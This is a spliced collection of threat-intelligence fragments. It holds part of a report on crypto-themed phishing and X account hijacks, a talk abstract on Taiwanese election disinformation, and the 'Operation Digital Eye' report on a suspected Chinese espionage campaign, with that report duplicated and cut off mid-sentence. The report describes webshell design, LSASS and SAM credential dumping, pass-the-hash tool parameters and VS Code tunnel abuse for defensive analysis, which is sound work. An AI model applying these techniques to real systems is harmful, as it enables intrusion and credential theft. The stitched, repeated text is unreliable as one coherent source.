phishing page hosting IP, it provides a good perspective of the length of this activity and its ability to avoid much attention for over a year.\nValidin Infrastructure Analysis Timeline\nOur observations suggest that the attacker is highly adaptable, continuously exploring new techniques while maintaining a clear financial motive. The targeting appears constrained, yet opportunistic. Notably, past public reports have attributed related activity to Turkish-speaking actors based on language phishing page source comment language. At this time, we do not attribute this campaign to a specific country or any widely-tracked threat actor.\nSome of the malicious sites and content hosted across 84.38.130[.]20 are built using the FASTPANEL DIRECT service.\nFASTPANEL landing page on buy-tanai[.]com\nFASTPANEL is a website hosting and building service that specializes in rapid building and management of websites. While FASTPANEL is not a malicious service, it is frequently abused by bad actors due to the ease of use, rapid scalability, and relatively low cost. FASTPANEL is routinely utilized by drainer gains and phishing campaigns, and is also included in associated guides and tutorials distributed throughout cybercrime communication channels.\nExample discussion of FASTPANEL (RU crime forum)\nOf the sites hosted on 84.38.130[.]20, the buy-tanai[.]com and emotionai[.]live sites still present the FASTPANEL landing pages as of this writing.\nPublicly Linkable Activity\nEmerging Account Intrusions\nWhile we have not yet established a high-confidence link, a recent compromise of a Tor Project account closely mirrors our observations. On January 30, 2025, the official X account for the Tor Project was breached. While it is possible that the same threat actor is responsible, we lack sufficient evidence to confirm the connection as of this writing.\nX post from The Tor Project account on January 30, 2025 advising users of a potential compromise\nTor Project account compromise notice\nThe Decentralized Autonomous Wireless Network (DAWN) was another victim of this type of attack. The threat actor leveraged the compromised DAWN-related social media accounts to lure victims into entering credentials into phishing pages targeting X and Telegram credentials.\nDAWN X Posts\nThe compromise of DAWN’s X accounts goes back to mid-January 2025.\nJanuary 14, 2025 – DAWN rewards compromise post\nCrypto-Themed Project Placeholders\nIn some cases, we’ve observed cryptocurrency themed projects seemingly acting as placeholders for future use, or direct pump-and-dump schemes. In one example, buy-tanai[.]com was pitched as such: “$TANA AI. Dawn’s AI project, Tana is the first AI-powered LP and trading agent, now live on the Solana blockchain.”\nTana AI (TANA) on Pump[.]fun\nThe domainbuy-tanai[.]com currently displays default FASTPANEL landing pages, suggesting it — along with other similar domains — is being staged for future attacks. Since FASTPANEL-managed sites can be rapidly updated, these domains serve as adaptable templates for phishing campaigns.\nNotably, TANA AI (TANA) was launched by Dawn in mid-January to promote AI-driven trading and liquidity provision in the cryptocurrency market.

By keeping them as blank templates, they can quickly modify hosted content to align with ongoing campaigns as needed.\nCrimeware Relations\nSeveral other domains share overlaps in both use and unique infrastructure details, yet they represent a fork from the previously described high-profile social media profile attacks, including:\ndataoptimix[.]com\ngamecodestudios[.]com\nshortwayscooter[.]com\nThe domain shortwayscooter[.]com hosts fake captchas that deliver the DanaBot banking trojan. DataOptimix is branded as a generative AI solution, though there are few details about what the service does.\nDataOptimix\nHistorical Connections\nIn mid-2024, a campaign used related infrastructure in similar phishing messages, including those which compromised the Linus Tech Tips Twitter account along with several other high profile users. At the time, @LinusTech had roughly 1.8million followers, which may represent the highest profile account successfully hijacked and linked to this actor.\nLinus Tech Tips Twitter compromise\nConclusion\nThe cryptocurrency landscape offers financially-motivated threat actors multiple opportunities for profit and fraud. While marketing for coins and tokens has long been irreverent and meme-driven, recent developments have further blurred the line between legitimate projects and scams. \nA striking example occurred in January 2025, when the X account of the late crypto-enthusiast and antivirus founder John McAfee was reactivated to promote a new coin, $AIntivirus. The marketing style and brand voice of this purportedly legitimate token closely resemble tactics used in known scam campaigns, highlighting how easily crypto enthusiasts can be misled in an already murky ecosystem.\nTo safeguard your X account, we strongly recommend using a unique password, enabling two-factor authentication (2FA), and avoiding credential sharing with third-party services.

The results indicated that the small amount of AI-content received no engagement and had no impact.\nInstead, Taiwanese billionaires earning most of their money in China mounted a concerted effort to buy or set up local news outlets in Taiwan in the run-up to the election. Conducting a large-scale analysis of these outlets’ output uncovered interesting results. Their viewership, numbering in the millions, presented slanted narratives aligned with the Beijing-friendly KMT and a new emergent third party. While losing the presidential election, these two parties managed to wrest control of Taiwan’s parliament and are set to have a major impact on the country’s foreign and domestic policies.\nThis presentation guides the audience through Chinese and local disinformation efforts in the Taiwanese election, highlighting the main lessons that can be drawn from them to safeguard future elections. Along the way, Martin explains the research methodology and toolbox that leverages open-source AI to fight disinformation.\n\nAbout the Author\nMartin Wendiggensen is a PhD candidate and lecturer at the Alperovitch Institute, focusing on Great Power Competition in Cyberspace, especially competition around AI and state-sponsored information operations.

SentinelLabs and Tinexta Cyber detected and interrupted the activities in their initial phases.</li>\n<li aria-level=\"1\">The threat actors used a lateral movement capability indicative of the presence of a shared vendor or digital quartermaster maintaining and provisioning tooling within the Chinese APT ecosystem.</li>\n<li aria-level=\"1\">The threat actors abused Visual Studio Code and Microsoft Azure infrastructure for C2 purposes, attempting to evade detection by making malicious activities appear legitimate.</li>\n<li aria-level=\"1\">Our visibility suggests that the abuse of Visual Studio Code for C2 purposes had been relatively rare in the wild prior to this campaign. Operation Digital Eye marks the first instance of a suspected Chinese APT group using this technique that we have directly observed.</li>\n</ul>\n<h2>Overview</h2>\n<p>Tinexta Cyber and SentinelLabs have been tracking threat activities targeting business-to-business IT service providers in Southern Europe. Based on the malware, infrastructure, techniques used, victimology, and the timing of the activities, we assess that it is highly likely these attacks were conducted by a China-nexus threat actor with cyberespionage motivations.</p>\n<p>The relationships between European countries and China are complex, characterized by cooperation, competition, and underlying tensions in areas such as trade, investment, and technology. Suspected China-linked cyberespionage groups <a href=\"https://cert.europa.eu/static/files/TLP-CLEAR-JointPublication-23-01.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">frequently</a> <a href=\"https://cert.europa.eu/publications/threat-intelligence/cb24-08/\" target=\"_blank\" rel=\"noopener noreferrer\">target</a> public and private organizations across Europe to gather strategic intelligence, gain competitive advantages, and advance geopolitical, economic, and technological interests.</p>\n<p>The attack campaign, which we have dubbed Operation Digital Eye, took place from late June to mid-July 2024, lasting approximately three weeks. The targeted organizations provide solutions for managing data, infrastructure, and cybersecurity for clients across various industries, making them prime targets for cyberespionage actors.</p>\n<p>A sustained presence within these organizations would provide the Operation Digital Eye actors with a strategic foothold, creating opportunities for intrusions across the digital supply chain and enabling them to exert control over critical IT processes within the downstream compromised entities. The attacks were detected and disrupted during their initial phases.</p>\n<p>The exact group behind Operation Digital Eye remains unclear due to the extensive <a href=\"https://www.sentinelone.com/labs/chinese-entanglement-dll-hijacking-in-the-asian-gambling-sector/\" target=\"_blank\" rel=\"noopener noreferrer\">sharing</a> of malware, operational playbooks, and infrastructure management processes within the Chinese threat landscape. The threat actors used a pass-the-hash capability, likely originating from the same source as closed-source custom Mimikatz modifications observed exclusively in suspected Chinese cyberespionage activities, such as <a href=\"https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers\" target=\"_blank\" rel=\"noopener noreferrer\">Operation Soft Cell</a> and <a href=\"https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/\" target=\"_blank\" rel=\"noopener noreferrer\">Operation Tainted Love</a>. The malware and tooling used in these campaigns have been <a href=\"https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">linked </a>to several distinct Chinese APT groups. We collectively refer to these custom Mimikatz modifications as mimCN.</p>\n<p>The long-term evolution and versioning of mimCN samples, along with notable features such as instructions left for a separate team of operators, suggest the involvement of a shared vendor or digital quartermaster responsible for the active maintenance and provisioning of tooling. This function within the Chinese APT ecosystem, corroborated by the <a href=\"https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/\" target=\"_blank\" rel=\"noopener noreferrer\">I-Soon leak</a>, likely plays a key role in facilitating China-nexus cyberespionage operations.</p>\n<p>The abuse of <a href=\"https://code.visualstudio.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Visual Studio Code</a> <a href=\"https://code.visualstudio.com/docs/remote/tunnels\" target=\"_blank\" rel=\"noopener noreferrer\">Remote Tunnels</a> for C2 purposes is central to this campaign. Originally designed to enable remote development, this technology provides full endpoint access, including command execution and filesystem manipulation. Additionally, Visual Studio Code tunneling involves executables signed by Microsoft and Microsoft Azure network infrastructure, both of which are often not closely monitored and are typically allowed by application controls and firewall rules. As a result, this technique may be challenging to detect and could evade security defenses. Combined with the full endpoint access it provides, this makes Visual Studio Code tunneling an attractive and powerful capability for threat actors to exploit.</p>\n<p>Tinexta Cyber and SentinelLabs have notified Microsoft about the abuse of Visual Studio Code and Azure infrastructure in connection with Operation Digital Eye.</p>\n<h2>Infection Vector and Attack Progression</h2>\n<p>The attackers used SQL (Structured Query Language) injection as an initial access vector to infiltrate Internet-facing web and database servers. <code>User-Agent</code> request headers in the web traffic logs we retrieved indicate that the attackers used the <a href=\"https://sqlmap.org/\" target=\"_blank\" rel=\"noopener noreferrer\">sqlmap</a> tool to automate the detection and exploitation of SQL injection vulnerabilities.</p>\n<p>To establish an initial foothold and maintain persistent access, the threat actors deployed a PHP-based webshell. Relatively simple in design and implementation, the webshell uses the <a href=\"https://www.php.net/manual/en/function.assert.php\" target=\"_blank\" rel=\"noopener noreferrer\">assert</a> function to execute attacker-provided PHP code. Its implementation does not resemble any other webshells we are familiar with. We track this webshell under the name PHPsert.</p>\n<p>To disguise the files implementing PHPsert and attempt to evade detection based on filesystem activity, the attackers used custom names tailored to the infiltrated environments, making the filenames appear legitimate. This included using the local language and terms that aligned with the technological context of the targeted organizations.</p>\n<p>After establishing an initial foothold, the threat actors conducted reconnaissance using a variety of third-party tools and built-in Windows utilities, such as <a href=\"https://joeware.net/freetools/tools/getuserinfo/index.htm\" target=\"_blank\" rel=\"noopener noreferrer\">GetUserInfo</a> and <code>ping</code>. They also deployed the <code>local.exe</code> tool, which is part of the Microsoft Windows NT Resource Kit and allows for viewing user group memberships.</p>\n<p>To steal credentials, the attackers used the <code>CreateDump</code> tool to <a href=\"https://lolbas-project.github.io/lolbas/OtherMSBinaries/Createdump/\" target=\"_blank\" rel=\"noopener noreferrer\">extract</a> memory allocated to the Local Security Authority Subsystem Service (LSASS) process and exfiltrate credentials. <code>CreateDump</code> is part of the Microsoft .NET Framework distribution. The threat actors also retrieved credentials from the Security Account Manager (SAM) database, which they extracted from the Windows Registry using the <code>reg save</code> <a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save\" target=\"_blank\" rel=\"noopener noreferrer\">command</a>.</p>\n<p>The threat actors frequently named the files they deployed using the pattern <code>do.*</code>. Examples include <code>do.log</code> (output from <code>ping</code> commands), <code>do.exe</code> (the <code>CreateDump</code> tool), and <code>do.bat</code> (a script that executes and deletes the <code>CreateDump</code> executable).</p>\n<p>From the initially compromised endpoints, the attackers moved laterally across the internal network, primarily using RDP (Remote Desktop Protocol) connections and pass-the-hash techniques. For the pass-the-hash attacks, they used a custom modified version of Mimikatz, implemented in an executable named <code>bK2o.exe</code>.</p>\n<p>In addition to the PHPsert webshell, the threat actors used two methods for remote command execution: SSH access, enabled by deploying <code>authorized_keys</code> files containing public keys for authentication, and Visual Studio Code Remote Tunnels.</p>\n<p>Visual Studio Code Remote Tunnels, based on Microsoft’s <a href=\"https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview\" target=\"_blank\" rel=\"noopener noreferrer\">dev tunnel</a> technology, enable developers to access and work on remote systems. This access includes the command terminal and file system, allowing activities such as command execution and file editing. The Operation Digital Eye actors abused this functionality to maintain persistent backdoor access to compromised systems.</p>\n<p>In an attempt to evade detection based on filesystem activity, the threat actors used <code>%SystemRoot%\\Temp</code> and <code>%ProgramData%\\Visual Studio Code</code> as their primary working directories for storing tools and data. <code>%SystemRoot%\\Temp</code> is a directory where Windows stores temporary files and is often monitored with less scrutiny. <code>%ProgramData%\\Visual Studio Code</code> was intended to appear as a legitimate directory associated with Visual Studio Code.</p>\n<p>The intrusions were detected and interrupted before the attackers could proceed to further phases, such as exfiltrating data.</p>\n<h2>Abuse of Visual Studio Code</h2>\n<p>The threat actors deployed a portable Visual Studio Code executable named <code>code.exe</code>, which is digitally signed by Microsoft, and used the <a href=\"https://github.com/winsw/winsw\" target=\"_blank\" rel=\"noopener noreferrer\">winsw</a> tool to run it as a Windows service. The <code>winsw</code> configuration file we retrieved indicates that the attackers created a service named <code>Visual Studio Code Service</code>, which executes <code>code.exe</code> with the <code>tunnel</code> command-line parameter at every system startup.</p>\n<p>The configuration file reveals a pragmatic approach by the threat actors, who likely modified a <a href=\"https://github.com/winsw/winsw/blob/v3/samples/complete.xml\" target=\"_blank\" rel=\"noopener noreferrer\">publicly available</a> <code>winsw</code> configuration. This is suggested by the use of the <code>myapp</code> service identifier and the <code>%BASE%\\logs</code> directory for storing <code>winsw</code> log files, both of which appear in the public configuration file as well as in the one we retrieved.</p>\n<figure id=\"attachment_109546\" aria-describedby=\"caption-attachment-109546\" style=\"width: 852px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye13.jpg\" alt=\"winsw configuration file\" width=\"852\" height=\"396\" class=\"size-full wp-image-109546\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye13.jpg 852w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye13-300x139.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye13-768x357.jpg 768w\" sizes=\"auto, (max-width: 852px) 100vw, 852px\" /><figcaption id=\"caption-attachment-109546\" class=\"wp-caption-text\">winsw configuration file</figcaption></figure>\n<p>The <code>tunnel</code> parameter instructs Visual Studio Code to create a dev tunnel and act as a server to which remote users can connect. After <a href=\"https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/security\" target=\"_blank\" rel=\"noopener noreferrer\">authenticating</a> to the tunnel with a Microsoft or GitHub account, remote users can access the endpoint running the Visual Studio Code server, either through the Visual Studio Code desktop application or the browser-based version, <a href=\"https://vscode.dev/\" target=\"_blank\" rel=\"noopener noreferrer\">vscode.dev</a>.</p>\n<p>After creating the dev tunnels, the threat actors authenticated using GitHub accounts and accessed the compromised endpoints through the browser-based version of Visual Studio Code. We have no knowledge of whether the threat actors used self-registered or compromised GitHub accounts to authenticate to the tunnels.</p>\n<h2>Network Infrastructure</h2>\n<p>The Operation Digital Eye actors used infrastructure located exclusively within Europe, sourced from the provider M247 and the Cloud platform Microsoft Azure. This was likely part of a deliberate strategy. Since the targeted organizations are based and operate within Europe, the attackers may have aimed to minimize suspicion by aligning their infrastructure&#8217;s location with that of their targets. Additionally, Cloud infrastructure commonly used in legitimate IT workflows, such as Microsoft Azure, is often not closely monitored and is frequently allowed through firewall restrictions. By leveraging public Cloud infrastructure for malicious purposes, the attackers made the traffic appear legitimate, which can be challenging to detect and may evade security defenses.</p>\n<p>In the initial phases of the attacks, the threat actors used the server with IP address <code>146.70.161[.]78</code> to establish initial access by detecting and exploiting SQL injection vulnerabilities, and the server with IP address <code>185.76.78[.]117</code> to operate the PHPsert webshell. Both IP addresses are allocated to the infrastructure provider M247 and are located in Poland and Italy, respectively.</p>\n<p>In the later phases of the attacks, the threat actors used the server with IP address <code>4.232.170[.]137</code> for C2 purposes when remotely accessing compromised endpoints via the SSH protocol. This server is part of Microsoft&#8217;s Azure infrastructure in the <code>Italy North</code> <a href=\"https://learn.microsoft.com/en-us/azure/virtual-machines/regions\" target=\"_blank\" rel=\"noopener noreferrer\">datacenter region</a> (<a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=56519\" target=\"_blank\" rel=\"noopener noreferrer\">Azure IP range</a>: <code>4.232.128[.]0/18</code>, <a href=\"https://learn.microsoft.com/en-us/azure/virtual-network/service-tags-overview\" target=\"_blank\" rel=\"noopener noreferrer\">service tag</a>: <code>AzureCloud.italynorth</code>). We currently have no information on whether the threat actors used self-registered or compromised Azure credentials to access and manage the Azure resources and services.</p>\n<p>The abuse of Visual Studio Code tunneling for C2 purposes also relies on Microsoft Azure infrastructure. Creating and hosting a dev tunnel requires connecting to a Microsoft Azure server with a domain of <code>*.[clusterID].devtunnels.ms</code>, where <code>[clusterID]</code> corresponds to the Azure region of the endpoint running the Visual Studio Code server, <a href=\"https://global.rel.tunnels.api.visualstudio.com/api/v1/clusters\" target=\"_blank\" rel=\"noopener noreferrer\">such as</a> <code>euw</code> for <code>West Europe</code>. In Operation Digital Eye, the creation of dev tunnels involved establishing connections to the server with the domain <code>[REDACTED].euw.devtunnels[.]ms</code>, which resolved to the IP address <code>20.103.221[.]187</code>. This server is part of Microsoft&#8217;s Azure infrastructure in the <code>West Europe</code> datacenter region (Azure IP range: <code>20.103.0[.]0/16</code>, service tag: <code>AzureCloud.westeurope</code>).</p>\n<h2>The PHPsert Webshell</h2>\n<p>PHPsert executes attacker-provided PHP code using the <a href=\"https://www.php.net/manual/en/function.assert.php\" target=\"_blank\" rel=\"noopener noreferrer\">assert</a> function, which, in PHP versions prior to 8.0.0, interprets and runs parameter strings as PHP code. To hinder static analysis and evade detection, the webshell uses various code obfuscation techniques, including XOR encoding, hexadecimal character representation, string concatenation, and randomized variable names.</p>\n<figure id=\"attachment_109540\" aria-describedby=\"caption-attachment-109540\" style=\"width: 664px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye3.jpg\" alt=\"PHPsert implementation\" width=\"664\" height=\"434\" class=\"size-full wp-image-109540\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye3.jpg 664w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye3-300x196.jpg 300w\" sizes=\"auto, (max-width: 664px) 100vw, 664px\" /><figcaption id=\"caption-attachment-109540\" class=\"wp-caption-text\">PHPsert implementation</figcaption></figure>\n<p>The PHPsert webshell operates as follows:</p>\n<ul>\n<li aria-level=\"1\">PHPsert instantiates a class with a single regular method, which XOR-decodes and concatenates hexadecimal characters to generate the string <code>assert</code>. The class&#8217;s destructor (the magic method <code>__destruct</code>) uses this string to invoke the <code>assert</code> function, passing attacker-provided PHP code as a parameter.</li>\n<li aria-level=\"1\">The webshell retrieves the attacker-provided PHP code from an HTTP POST request parameter, for example, <code>momomomo</code>. If the <code>id</code> parameter is present in the request URL, PHPsert decodes the Base64-encoded value of the POST parameter. If the <code>id</code> parameter is absent, the webshell uses the raw value of the parameter.</li>\n<li aria-level=\"1\">Finally, when PHPsert finishes executing, the class&#8217;s destructor is invoked, which in turn calls the <code>assert</code> function to execute the attacker-provided PHP code.</li>\n</ul>\n<p>We identified multiple PHPsert variants, which have been submitted to malware sharing platforms since May 2023, from various locations including Japan, Singapore, Peru, Taiwan, Iran, Korea, and the Philippines. These variants show only minor differences in their implementation, such as varying variable names and POST request parameters like <code>mr6</code>, <code>brute</code>, and <code>qq</code>. Our analysis suggests that PHPsert is deployed not only as a standalone PHP file but is also integrated into various types of web content, including web text editors and content management systems.</p>\n<p>One of the PHPsert variants contains commented-out code snippets and comments in simplified Chinese that describe nearby code. These comments and snippets are not present in the PHPsert versions observed in Operation Digital Eye, nor in any of the webshell’s other variants.

To achieve this, <code>bK2o.exe</code> overwrites memory of the LSASS process. The tool supports the following command-line parameters:</p>\n<ul>\n<li aria-level=\"1\"><code>/c</code>: The process to execute; defaults to <code>cmd.exe</code> if not provided.</li>\n<li aria-level=\"1\"><code>/u</code>: The user’s username.</li>\n<li aria-level=\"1\"><code>/d</code>: The user’s domain.</li>\n<li aria-level=\"1\"><code>/h</code>: The NTLM password hash.</li>\n</ul>\n<p><code>bK2o.exe</code> implements a pass-the-hash technique by overwriting LSASS memory in a manner similar to Mimikatz, with its implementation partially overlapping with Mimikatz functions such as <code>kuhl_m_sekurlsa_pth_luid</code> and <code>kuhl_m_sekurlsa_msv_enum_cred_callback_pth</code>.

Combined with the presence of overlapping mimCN samples across various intrusions attributed to China-nexus APT groups and distributed over years, this suggests that mimCN is likely the product of an entity responsible for maintaining and provisioning tools to multiple clusters within the Chinese APT ecosystem.</p>\n<h2>Attribution Analysis</h2>\n<p>We assess that Operation Digital Eye was highly likely conducted by a China-nexus cluster with cyberespionage motivations. The specific group responsible remains unclear due to the extensive sharing of malware, operational playbooks, and infrastructure management processes among Chinese APT clusters. Our assessment is based on a collective consideration of multiple indicators, including the malware, infrastructure, and techniques used, victimology, and the timing of the activities.</p>\n<h3>Malware</h3>\n<p>A variant of the PHPsert webshell contains code comments in simplified Chinese. This suggests the potential involvement of Chinese-speaking developers. Further, the custom Mimikatz modification <code>bK2o.exe</code> used in Operation Digital Eye is part of the mimCN collection and shares implementation overlaps with other custom Mimikatz modifications, suggesting a common origin. These tools have been observed exclusively in the context of suspected Chinese APT activities, such as <a href=\"https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers\" target=\"_blank\" rel=\"noopener noreferrer\">Operation Soft Cell</a> and <a href=\"https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/\" target=\"_blank\" rel=\"noopener noreferrer\">Operation Tainted Love</a>. Malware and tooling used in these operations have been associated with the suspected Chinese APT groups Granite Typhoon and APT41, and <a href=\"https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">possible connections</a> to other China-nexus groups, such as APT10 and Lucky Mouse have also been suggested.</p>\n<p>The mimCN tool collection suggests the presence of a shared vendor or digital quartermaster responsible for the sustained development and provisioning of tools to groups within the Chinese APT ecosystem. This function is <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">suspected</a> to play a significant role in the Chinese threat landscape. The <a href=\"https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/\" target=\"_blank\" rel=\"noopener noreferrer\">I-Soon leak</a>, which offers rare insight into China’s cyberespionage activities, provides supporting evidence for the existence of digital quartermasters within this landscape.</p>\n<h3>Infrastructure</h3>\n<p>While not exclusive to Chinese APT groups, the use of M247 infrastructure, as seen in Operation Digital Eye, has been common among them in recent years. One example is the <a href=\"https://www.sentinelone.com/labs/sandman-apt-china-based-adversaries-embrace-lua/\" target=\"_blank\" rel=\"noopener noreferrer\">M247 infrastructure attributed</a> to the suspected Chinese cluster STORM-0866 (also known as Red Dev 40), with which the <a href=\"https://www.sentinelone.com/labs/sandman-apt-a-mystery-group-targeting-telcos-with-a-luajit-toolkit/\" target=\"_blank\" rel=\"noopener noreferrer\">Sandman APT group</a> is associated.</p>\n<p>Additionally, the use of Cloud services and resources located in geographic proximity to the targeted organizations in Operation Digital Eye suggests a carefully planned and targeted infrastructure management approach. In this context, we suspect the potential involvement of third-party entities tasked with administering and provisioning infrastructure, a practice that has become <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/\" target=\"_blank\" rel=\"noopener noreferrer\">increasingly common</a> in the Chinese APT ecosystem in recent years.</p>\n<h3>Abuse of Visual Studio Code</h3>\n<p>Our visibility into threat actor activities suggests that the abuse of Visual Studio Code tunneling for C2 purposes was relatively rare in the wild before Operation Digital Eye.</p>\n<p>Previous <a href=\"https://venturebeat.com/security/crowdstrike-2024-report-exposes-north-koreas-covert-workforce-in-u-s-tech-firms/\" target=\"_blank\" rel=\"noopener noreferrer\">research</a> indicates that, starting in 2023, a suspected North Korean group has used Visual Studio Remote Tunnels to maintain persistence in compromised networks. Additionally, in October 2024, Cyble released a <a href=\"https://cyble.com/blog/silent-intrusion-unraveling-the-sophisticated-attack-leveraging-vs-code-for-unauthorized-access/\" target=\"_blank\" rel=\"noopener noreferrer\">report</a> documenting unattributed activity in which threat actors distributed a <a href=\"https://www.sentinelone.com/labs/who-needs-macros-threat-actors-pivot-to-abusing-explorer-and-other-lolbins-via-windows-shortcuts/\" target=\"_blank\" rel=\"noopener noreferrer\">Windows Shortcut</a> (LNK) file to deploy Visual Studio Code and activate its tunneling feature to establish remote access.</p>\n<p>As of this writing, the only publicly disclosed use of this technique around the time of Operation Digital Eye has been attributed to a suspected Chinese APT group. In September 2024, Unit 42 published a <a href=\"https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/\" target=\"_blank\" rel=\"noopener noreferrer\">report</a> on a campaign targeting government entities in Southeast Asia, in which threat actors used Visual Studio Code as a backdoor. The campaign was attributed to Stately Taurus (also known as Mustang Panda). The exact timeline of the campaign is unclear, with mid-August 2024 being the only reference point explicitly mentioned in the Unit 42 report. Based on this, we suspect that Operation Digital Eye occurred prior to this activity.</p>\n<p>We did not observe any overlaps in TTPs between Operation Digital Eye and the activity reported by Unit 42, except for the abuse of Visual Studio Code. We recognize the possibility that distinct Chinese APT clusters may share operational playbooks that include leveraging Visual Studio Code for C2 purposes.</p>\n<h3>Temporal Analysis</h3>\n<p>Our analysis of timestamps marking the dates and times of operator activity in the targeted organizations showed that all activities occurred on workdays (Monday to Friday). Additionally, converting the timestamps from their original time zones, Coordinated Universal Time (UTC) and Central European Summer Time (CEST, UTC+2), to China Standard Time (CST, UTC+8) revealed that the operators were primarily active during typical working hours in China, mostly between 9 a.m. and 9 p.m. CST.</p>\n<p>This suggests a potentially state-sanctioned operation. The &#8216;996&#8217; work schedule (9 a.m. to 9 p.m. CST, six days a week) has been common in China’s technology sector, but it was <a href=\"https://www.reuters.com/world/china/chinese-authorities-say-overtime-996-policy-is-illegal-2021-08-27/\" target=\"_blank\" rel=\"noopener noreferrer\">ruled illegal</a> by the Supreme People&#8217;s Court in 2021. As a result, state employees are almost certainly restricted to weekday work, typically between 9 a.m. and 9 p.m., aligning closely with our observations from the timestamp analysis.</p>\n<p>The figure below shows the total number of connections established by the threat actors to Visual Studio Code tunnels throughout Operation Digital Eye, broken down by hour of the day. The data is presented in both the original time zone (CEST) and in China Standard Time (CST, CEST+6). We observed minimal to no activity between 10 p.m. and 9 a.m. CST, as well as between 11 a.m. and 1 p.m. CST, which aligns with the typical daily working hours in China, including the midday lunch break.</p>\n<figure id=\"attachment_109536\" aria-describedby=\"caption-attachment-109536\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7.jpg\" alt=\"Number of established connections to Visual Studio Code tunnels\" width=\"1999\" height=\"704\" class=\"size-full wp-image-109536\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7-300x106.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7-1024x361.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7-768x270.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7-1536x541.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-109536\" class=\"wp-caption-text\">Number of established connections to Visual Studio Code tunnels</figcaption></figure>\n<h2>Conclusions</h2>\n<p>Operation Digital Eye highlights the persistent threat posed by Chinese cyberespionage groups to European entities, with these threat actors continuing to focus on high-value targets. The campaign underscores the strategic nature of this threat, as breaching organizations that provide data, infrastructure, and cybersecurity solutions to other industries gives the attackers a foothold in the digital supply chain, enabling them to extend their reach to downstream entities.</p>\n<p>The abuse of Visual Studio Code Remote Tunnels in this campaign illustrates how Chinese APT groups often rely on practical, solution-oriented approaches to evade detection. By leveraging a trusted development tool and infrastructure, the threat actors aimed to disguise their malicious activities as legitimate. The exploitation of widely used technologies, which security teams may not scrutinize closely, presents a growing challenge for organizations. For defenders, this calls for a reevaluation of traditional security approaches and the implementation of robust detection mechanisms to identify such evasive techniques in real time.</p>\n<p>Lateral movement capabilities observed in Operation Digital Eye, linked to custom Mimikatz modifications used in previous campaigns, indicate the potential involvement of shared vendors or digital quartermasters and the important function they serve in the Chinese APT ecosystem. These centralized entities provide continuity and adaptability to cyberespionage operations, equipping threat actors with consistently updated tools and evolving tactics as they target new victims.</p>\n<h2>Indicators of Compromise</h2>\n<div style=\"font-size:0.8em\">\n<b>SHA1 Hashes</b></p>\n<div style=\"overflow-x:auto;\">\n<table style=\"border-collapse: collapse;

SentinelLabs and Tinexta Cyber detected and interrupted the activities in their initial phases.\nThe threat actors used a lateral movement capability indicative of the presence of a shared vendor or digital quartermaster maintaining and provisioning tooling within the Chinese APT ecosystem.\nThe threat actors abused Visual Studio Code and Microsoft Azure infrastructure for C2 purposes, attempting to evade detection by making malicious activities appear legitimate.\nOur visibility suggests that the abuse of Visual Studio Code for C2 purposes had been relatively rare in the wild prior to this campaign. Operation Digital Eye marks the first instance of a suspected Chinese APT group using this technique that we have directly observed.\nOverview\nTinexta Cyber and SentinelLabs have been tracking threat activities targeting business-to-business IT service providers in Southern Europe. Based on the malware, infrastructure, techniques used, victimology, and the timing of the activities, we assess that it is highly likely these attacks were conducted by a China-nexus threat actor with cyberespionage motivations.\nThe relationships between European countries and China are complex, characterized by cooperation, competition, and underlying tensions in areas such as trade, investment, and technology. Suspected China-linked cyberespionage groups frequently target public and private organizations across Europe to gather strategic intelligence, gain competitive advantages, and advance geopolitical, economic, and technological interests.\nThe attack campaign, which we have dubbed Operation Digital Eye, took place from late June to mid-July 2024, lasting approximately three weeks. The targeted organizations provide solutions for managing data, infrastructure, and cybersecurity for clients across various industries, making them prime targets for cyberespionage actors.\nA sustained presence within these organizations would provide the Operation Digital Eye actors with a strategic foothold, creating opportunities for intrusions across the digital supply chain and enabling them to exert control over critical IT processes within the downstream compromised entities. The attacks were detected and disrupted during their initial phases.\nThe exact group behind Operation Digital 